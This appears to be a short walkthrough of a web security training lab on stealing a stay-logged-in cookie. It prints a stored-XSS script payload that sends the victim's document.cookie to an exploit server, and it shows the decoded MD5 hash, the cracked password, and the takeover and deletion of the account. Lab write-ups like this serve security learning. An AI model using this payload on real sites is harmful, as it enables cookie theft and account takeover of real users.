# Offline password cracking
- lab stores the user's password hash in a cookie
- contains an XSS vulnerability in the comment functionality
- Your credentials: wiener:peter
- Victim's username: carlos

# Goal
- obtain Carlos's stay-logged-in cookie and use it to crack his password. Then, log in as carlos and delete his account from the "My account" page.
# Solving The Lab
- login in wih wiener and check the cookie
- Notice that the stay-logged-in cookie is Base64 encoded
- we see that it is constructed as follows:
```
username+':'+md5HashOfPassword
```
- the comment functionality is vulnerable to XSS
- Go to the exploit server and make a note of the URL
- post a comment containing
```
<script>document.location='https://exploit-0a5700de03ca393a81fc563c012800ec.exploit-server.net/exploit'+document.cookie</script>
```
- open the access log. There should be a GET request from the victim containing their stay-logged-in cookie
- Decode the cookie in Burp Decoder and will result in
```
carlos:26323c16d5f4dabff3bb136f2460a943
```
- Copy the hash and paste it into a search engine. This will reveal that the password
```
onceuponatime
```
- Log in to the victim's account, go to the "My account" page, and delete their account and we solved the lab
